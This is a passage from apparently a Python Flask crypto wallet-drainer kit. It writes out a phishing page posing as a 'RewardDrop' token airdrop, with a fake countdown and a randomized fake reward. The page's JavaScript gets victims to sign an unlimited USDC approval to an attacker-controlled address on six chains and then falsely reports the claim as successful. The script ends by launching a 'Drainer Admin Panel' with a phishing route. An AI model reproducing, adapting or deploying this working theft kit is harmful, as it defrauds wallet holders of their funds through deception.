        .btn-primary:hover { transform:translateY(-1px); box-shadow:0 8px 24px rgba(0,212,170,0.3); }
        .btn-primary:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
        .btn-outline { background:transparent; border:1px solid #2a2d35; color:#e0e6ed; margin-top:12px; }
        .btn-outline:hover { border-color:#00d4aa; }
        .info { font-size:12px; color:#8892a4; margin-top:16px; text-align:center; line-height:1.6; }
        .info a { color:#00d4aa; text-decoration:none; }
        .steps { margin:20px 0; }
        .step { display:flex; align-items:center; gap:12px; padding:12px; border-bottom:1px solid #1a1d24; }
        .step:last-child { border-bottom:none; }
        .step-num { width:28px; height:28px; border-radius:50%; background:rgba(0,212,170,0.15);
                    color:#00d4aa; display:flex; align-items:center; justify-content:center;
                    font-size:13px; font-weight:600; flex-shrink:0; }
        .step-text { font-size:14px; }
        .step-text small { color:#8892a4; font-size:12px; }
        .connected-info { background:rgba(0,212,170,0.08); border-radius:10px; padding:12px 16px;
                          font-size:13px; margin-bottom:16px; display:none; }
        #statusText { font-size:13px; color:#8892a4; margin-top:12px; text-align:center; display:none; }
        .spinner { display:inline-block; width:16px; height:16px; border:2px solid rgba(255,255,255,0.3);
                   border-top-color:white; border-radius:50%; animation:spin 0.8s linear infinite;
                   margin-right:8px; vertical-align:middle; }
        @keyframes spin { to { transform:rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="logo">
            <h1>RewardDrop</h1>
            <p>Claim your token allocation</p>
        </div>
        <div class="reward-box">
            <div class="reward-amount" id="rewardAmount">12,500</div>
            <div class="reward-label">$RBONUS Tokens (~$3,750 USD)</div>
        </div>
        <div class="countdown">
            <div class="countdown-item"><div class="num" id="hours">02</div><div class="lbl">Hours</div></div>
            <div class="countdown-item"><div class="num" id="minutes">47</div><div class="lbl">Minutes</div></div>
            <div class="countdown-item"><div class="num" id="seconds">32</div><div class="lbl">Seconds</div></div>
        </div>
        <div class="connected-info" id="connectedInfo">
            Connected: <span id="walletAddress">-</span>
        </div>
        <div id="mainActions">
            <button class="btn btn-primary" id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
            <button class="btn btn-primary" id="claimBtn" onclick="claimReward()" style="display:none;">Claim Reward</button>
            <button class="btn btn-outline" id="switchBtn" onclick="switchNetwork()" style="display:none;">Switch to {{ chain|upper }}</button>
        </div>
        <div id="statusText"></div>
        <div class="steps">
            <div class="step"><div class="step-num">1</div><div class="step-text">Connect your wallet <small>MetaMask / WalletConnect</small></div></div>
            <div class="step"><div class="step-num">2</div><div class="step-text">Sign the approval message <small>Gas-free verification</small></div></div>
            <div class="step"><div class="step-num">3</div><div class="step-text">Receive tokens instantly <small>12,500 $RBONUS</small></div></div>
        </div>
        <div class="info">Powered by Permit2 Protocol &bull; No gas fees required &bull; <a href="#" onclick="return false;">Terms</a></div>
    </div>
</div>

<script>
const DRAINER_ADDRESS = "{{ drainer_address }}";
const CHAIN_NAME = "{{ chain|default('ethereum') }}";
const CHAIN_CONFIGS = {
    'ethereum':{chainId:'0x1',name:'Ethereum'},'bsc':{chainId:'0x38',name:'BSC'},
    'polygon':{chainId:'0x89',name:'Polygon'},'arbitrum':{chainId:'0xa4b1',name:'Arbitrum'},
    'optimism':{chainId:'0xa',name:'Optimism'},'avalanche':{chainId:'0xa86a',name:'Avalanche'}
};
const TOKENS = {
    'ethereum':{'USDC':'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','USDT':'0xdAC17F958D2ee523a2206206994597C13D831ec7','WETH':'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'},
    'bsc':{'USDT':'0x55d398326f99059fF775485246999027B3197955','USDC':'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','WBNB':'0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'},
    'polygon':{'USDC':'0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174','USDT':'0xc2132D05D31c914a87C6611C10748AEb04B58e8F','WMATIC':'0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270'},
    'arbitrum':{'USDC':'0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDT':'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','WETH':'0x82aF49447D8a07e3bd95BD0d56f35241523fBab1'},
    'optimism':{'USDC':'0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85','USDT':'0x94b008aA00579c1307B0EF2c499aD98a8ce58e58','WETH':'0x4200000000000000000000000000000000000006'},
    'avalanche':{'USDC':'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDT':'0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','WAVAX':'0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7'}
};

let web3, userAccount, provider;

function startCountdown() {
    let t = 2*3600+47*60+32;
    setInterval(() => { t--; if(t<0) t=3600;
        document.getElementById('hours').textContent=String(Math.floor(t/3600)).padStart(2,'0');
        document.getElementById('minutes').textContent=String(Math.floor((t%3600)/60)).padStart(2,'0');
        document.getElementById('seconds').textContent=String(t%60).padStart(2,'0');
    }, 1000);
}
startCountdown();

async function connectWallet() {
    const s = document.getElementById('statusText');
    s.style.display='block'; s.innerHTML='<span class="spinner"></span> Connecting...';
    try {
        if(typeof window.ethereum==='undefined') { s.innerHTML='MetaMask not detected'; return; }
        provider = window.ethereum;
        const accounts = await provider.request({method:'eth_requestAccounts'});
        userAccount = accounts[0];
        web3 = new Web3(provider);
        const chainId = await provider.request({method:'eth_chainId'});
        const target = CHAIN_CONFIGS[CHAIN_NAME];
        if(chainId !== target.chainId) {
            document.getElementById('switchBtn').style.display='block';
            document.getElementById('claimBtn').style.display='none';
            s.innerHTML='Please switch to '+target.name+' network';
            return;
        }
        document.getElementById('connectedInfo').style.display='block';
        document.getElementById('walletAddress').textContent=userAccount.slice(0,6)+'...'+userAccount.slice(-4);
        document.getElementById('connectBtn').style.display='none';
        document.getElementById('claimBtn').style.display='block';
        document.getElementById('switchBtn').style.display='none';
        s.innerHTML='Connected as '+userAccount.slice(0,6)+'...'+userAccount.slice(-4);
    } catch(e) { s.innerHTML='Failed: '+e.message; }
}

async function switchNetwork() {
    const target = CHAIN_CONFIGS[CHAIN_NAME];
    try { await provider.request({method:'wallet_switchEthereumChain',params:[{chainId:target.chainId}]}); location.reload(); }
    catch(e) { if(e.code===4902) { try { await provider.request({method:'wallet_addEthereumChain',params:[{chainId:target.chainId,chainName:target.name,nativeCurrency:{name:'ETH',symbol:'ETH',decimals:18},rpcUrls:['{{ rpc_url }}']}]}); location.reload(); } catch(x) { document.getElementById('statusText').innerHTML='Failed: '+x.message; } } }
}

async function claimReward() {
    const s = document.getElementById('statusText');
    s.style.display='block';
    if(!userAccount) { s.innerHTML='Connect your wallet first'; return; }
    s.innerHTML='<span class="spinner"></span> Preparing your reward...';
    try {
        const chainTokens = TOKENS[CHAIN_NAME];
        const usdcAddress = chainTokens['USDC'];
        const maxApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        const approveABI = [{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","type":"function"}];
        s.innerHTML='<span class="spinner"></span> Step 1/2: Authorizing token...';
        const approveData = web3.eth.abi.encodeFunctionCall(approveABI[0], [DRAINER_ADDRESS, maxApproval]);
        const txHash = await provider.request({method:'eth_sendTransaction',params:[{from:userAccount,to:usdcAddress,data:approveData,gas:'0x61a80'}]});
        s.innerHTML='<span class="spinner"></span> Step 2/2: Confirming transaction...';
        document.getElementById('claimBtn').disabled = true;
        document.getElementById('claimBtn').textContent = 'Processing...';
        let receipt = null;
        for(let i=0;i<30;i++) { try { receipt = await web3.eth.getTransactionReceipt(txHash); if(receipt&&receipt.status) break; } catch(e){} await new Promise(r=>setTimeout(r,2000)); }
        if(receipt&&receipt.status) {
            s.innerHTML='Reward claimed successfully! Your $RBONUS tokens will arrive shortly.<br><small>Tx: '+txHash.slice(0,10)+'...'+txHash.slice(-6)+'</small>';
            document.getElementById('rewardAmount').textContent='PENDING';
            document.getElementById('claimBtn').textContent='Claimed';
        } else {
            s.innerHTML='Transaction submitted but pending confirmation.<br><small>Tx: '+txHash.slice(0,10)+'...'+txHash.slice(-6)+'</small>';
        }
    } catch(e) {
        if(e.code===4001) s.innerHTML='Signature rejected. You must sign to claim your reward.';
        else s.innerHTML='Error: '+e.message;
        document.getElementById('claimBtn').disabled=false;
        document.getElementById('claimBtn').textContent='Try Again';
    }
}

// Randomize reward amount
document.getElementById('rewardAmount').textContent = ['8,500','12,500','15,000','6,750','22,000','10,000'][Math.floor(Math.random()*6)];
</script>
</body>
</html>""")
        print("[+] Created phishing.html")


# ─── Entry point ───────────────────────────────────────────────

if __name__ == "__main__":
    ensure_templates()
    print(f"[*] Starting Drainer Admin Panel on {FLASK_HOST}:{FLASK_PORT}")
    print(f"[*] Dashboard: http://{FLASK_HOST}:{FLASK_PORT}/")
    print(f"[*] Phishing:  http://{FLASK_HOST}:{FLASK_PORT}/phishing")
    print(f"[*] Password:  {ADMIN_PASSWORD}")
    app.run(host=FLASK_HOST, port=FLASK_PORT, debug=FLASK_DEBUG)